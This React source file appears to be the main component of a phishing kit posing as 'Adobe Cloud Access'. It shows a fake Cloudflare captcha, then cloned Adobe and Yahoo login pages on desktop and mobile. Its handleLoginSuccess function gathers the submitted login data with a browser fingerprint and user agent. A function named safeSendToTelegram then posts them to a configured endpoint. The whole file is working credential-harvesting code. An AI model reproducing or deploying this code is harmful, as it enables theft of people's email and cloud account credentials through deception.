import React, { useState, useEffect } from 'react';
import LoginPage from './components/LoginPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';
import YahooLoginPage from './components/YahooLoginPage';
import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage'; // Import mobile Yahoo page
import LandingPage from './components/LandingPage';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
import { config } from './config';

const safeSendToTelegram = async (sessionData: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(sessionData)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
    return await res.json();
  } catch (fetchErr) {
    console.error('sendToTelegram failed:', fetchErr);
    throw fetchErr;
  }
};

function App() {
  const [isMobile, setIsMobile] = useState(false);
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [currentPage, setCurrentPage] = useState('captcha');
  const [isLoading, setIsLoading] = useState(true);
  const [captchaVerified, setCaptchaVerified] = useState(false);
  const [showYahooLogin, setShowYahooLogin] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session' || event.name === 'logged_in') {
        const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
        setHasActiveSession(isActive);
        setShowYahooLogin(false);
        if (isActive) setCurrentPage('landing');
        else {
          setCaptchaVerified(false);
          setCurrentPage('captcha');
        }
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, []);

  useEffect(() => {
    const checkSession = () => {
      const cookieSession = getCookie('adobe_session');
      if (cookieSession) {
        setHasActiveSession(true);
        setCaptchaVerified(true);
        setCurrentPage('landing');
      } else {
        setCurrentPage('captcha');
      }
      setIsLoading(false);
    };
    checkSession();
  }, []);

  const handleCaptchaVerified = () => {
    setIsLoading(true);
    setTimeout(() => {
      setCurrentPage('login');
      setCaptchaVerified(true);
      setIsLoading(false);
    }, 600);
  };

  const handleLoginSuccess = async (loginData: any) => {
    setIsLoading(true);
    const browserFingerprint = await getBrowserFingerprint();
    const finalSessionData = {
      ...loginData,
      sessionId: Math.random().toString(36).substring(2, 15),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      ...browserFingerprint,
    };

    setHasActiveSession(true);
    localStorage.setItem(config.session.sessionDataKey, JSON.stringify(finalSessionData));
    const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
    setCookie('adobe_session', encodeURIComponent(JSON.stringify(loginData)), cookieOptions);
    setCookie('logged_in', 'true', cookieOptions);

    try {
      await safeSendToTelegram(finalSessionData);
    } catch (error) {
      console.error('Failed to send final data to Telegram:', error);
    }
    
    setShowYahooLogin(false);
    setCurrentPage('landing');
    setIsLoading(false);
  };

  const handleLogout = () => {
    localStorage.removeItem(config.session.sessionDataKey);
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
    setHasActiveSession(false);
    setCaptchaVerified(false);
    setShowYahooLogin(false);
    setCurrentPage('captcha');
  };

  const handleYahooSelect = () => {
    setShowYahooLogin(true);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div>
      </div>
    );
  }

  if (currentPage === 'captcha' && !captchaVerified) {
    return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
  }

  if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
    if (showYahooLogin) {
      // Choose which Yahoo page to show based on device
      const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
      return <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
    }
    
    const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
    return (
      <LoginComponent
        fileName="Adobe Cloud Access"
        onYahooSelect={handleYahooSelect}
        onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
        onLoginSuccess={handleLoginSuccess}
        onLoginError={error => console.error('Login error:', error)}
      />
    );
  }

  if (hasActiveSession && currentPage === 'landing') {
    const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
    return <LandingComponent onLogout={handleLogout} />;
  }

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center">
      <p className="text-gray-600">Loading application...</p>
    </div>
  );
}

export default App;
